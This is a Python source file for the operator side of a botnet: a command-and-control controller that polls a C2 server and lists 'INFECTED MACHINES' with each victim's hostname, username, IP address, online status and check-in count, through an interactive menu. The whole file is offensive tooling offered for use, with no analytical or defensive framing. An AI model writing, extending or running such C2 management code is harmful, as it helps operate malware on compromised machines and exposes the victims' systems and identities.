import requests
import json
import time
from datetime import datetime
from config import HOST

class Controller:
    def __init__(self):
        self.server_url = HOST
    
    def get_connected_clients(self):
        try:
            print(f"[+] Fetching connected clients from {self.server_url}")
            response = requests.get(f"{self.server_url}/admin/clients", timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                clients = data.get('clients', [])
                
                print(f"[+] ✅ Successfully retrieved {len(clients)} clients")
                return clients


            else:
                print(f"[-] ❌ Server returned {response.status_code}")
                print(f"[-] Response: {response.text}")
                return []
                
        except requests.exceptions.ConnectionError:
            print(f"[-] ❌ Cannot connect to C2 server at {self.server_url}")
            return []

        except Exception as e:
            print(f"[-] ❌ Error fetching clients: {e}")
            return []
    
    def display_clients(self, clients):
        if not clients:
            print("[-] No clients connected")
            return
        
        
        print("\n" + "="*80)
        print("INFECTED MACHINES")
        print("="*80)
        

        online_count = 0
        for i, client in enumerate(clients, 1):
            status = "🟢 ONLINE" if client.get('online') else "🔴 OFFLINE"
            if client.get('online'):
                online_count += 1
            
            system_info = client.get('system_info', {})
            platform_name = system_info.get('platform', 'Unknown')
            hostname = system_info.get('hostname', 'Unknown')
            username = system_info.get('username', 'Unknown')
            
            last_seen = datetime.fromtimestamp(client.get('last_seen', 0))
            uptime = time.strftime('%H:%M:%S', time.gmtime(client.get('uptime_seconds', 0)))
            
            print(f"\n{i}. {client['client_id']}")
            print(f"   Status: {status}")
            print(f"   System: {platform_name} | {hostname} | {username}")
            print(f"   IP: {client.get('ip', 'Unknown')}")
            print(f"   Last Seen: {last_seen}")
            print(f"   Uptime: {uptime}")
            print(f"   Check-ins: {client.get('checkin_count', 0)}")
            print("-" * 80)
        
        print(f"\n SUMMARY: {online_count}/{len(clients)} clients online")
    
    def get_server_status(self):
        try:
            response = requests.get(f"{self.server_url}/admin/status", timeout=5)
            if response.status_code == 200:
                return response.json()
            return {}
        except:
            return {}
    
    def interactive_mode(self):
        print("\n" + "="*50)
        print("C2 CONTROLLER - INFECTED MACHINES LIST")
        print("="*50)
        

        status = self.get_server_status()
        if status:
            print(f"Server: {self.server_url}")
            print(f"🟢 Status: {status.get('status', 'unknown')}")
            print(f" Total Clients: {status.get('total_clients', 0)}")
            print(f"🟢 Online Now: {status.get('online_clients', 0)}")
        else:
            print(f"Server: {self.server_url}")
            print("🔴 Cannot connect to server")
        
        while True:
            print("\n" + "="*40)
            print("Available Commands:")
            print("1. Refresh client list")
            print("2. Server status") 
            print("3. Exit")
            print("="*40)
            
            choice = input("\nSelect option (1-3): ").strip()
            
            if choice == "1":
                print("\n[+] Fetching client list...")
                clients = self.get_connected_clients()
                self.display_clients(clients)
                
            elif choice == "2":
                status = self.get_server_status()
                if status:
                    print(f"\n SERVER STATUS:")
                    print(f"  Status: {status.get('status', 'unknown')}")
                    print(f"  Total Clients: {status.get('total_clients', 0)}")
                    print(f"  Online Clients: {status.get('online_clients', 0)}")
                    uptime = time.strftime('%H:%M:%S', time.gmtime(status.get('uptime_seconds', 0)))
                    print(f"  Server Uptime: {uptime}")
                else:
                    print("[-] Cannot get server status")
                    
            elif choice == "3":
                print("[+] Exiting controller")
                break
            else:
                print("[-] Invalid option")

if __name__ == "__main__":
    controller = Controller()
    controller.interactive_mode()